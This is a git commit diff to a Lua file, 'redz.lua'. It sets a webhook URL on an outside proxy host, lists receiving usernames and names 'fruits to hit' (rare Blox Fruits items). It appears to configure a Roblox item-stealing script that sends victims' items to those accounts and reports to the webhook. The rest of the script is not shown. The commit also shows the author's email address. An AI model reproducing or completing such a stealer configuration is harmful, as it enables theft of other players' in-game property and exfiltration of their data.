8947c7d29aee2c4698186f7028788a85fc97ff9d
uwuwuwuwuwuu <Dannyzheng75@gmail.com>
2025-04-13 17:58:31 -0400

    Update redz.lua

--- redz.lua
+++ redz.lua
@@ -1,4 +1,4 @@
-Webhook = "" -- << Your Webhook
+Webhook = "" -- <<https://webhook-protect.vercel.app/api/webhook?id=YXV1VXlETlZWZ3Z2SEhIcy1naFJ5ZzpWTlRvWFEyQ2ZqX21lSEdKQmJ3Z0R0VnQxQmhqRi16czNlOWRqVF9FSktyTTBEanItbmtva0lzSVZkYktmYmZ2LV9lMHBxdDJXS3pDeGZuR1BlbzZxbHpQVUY1QndVZ20xZEdzMVBBaHNOeVBkMXN5WUw5OW9Tc1ZGaHl0Tl82dlRLN3dSLXBpeXc2SUpUX1dpQXl0dGsxdXQxVkR2b2syOVpBNE16R0lXNDQ
 Usernames = {"Dannyzheng2021", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
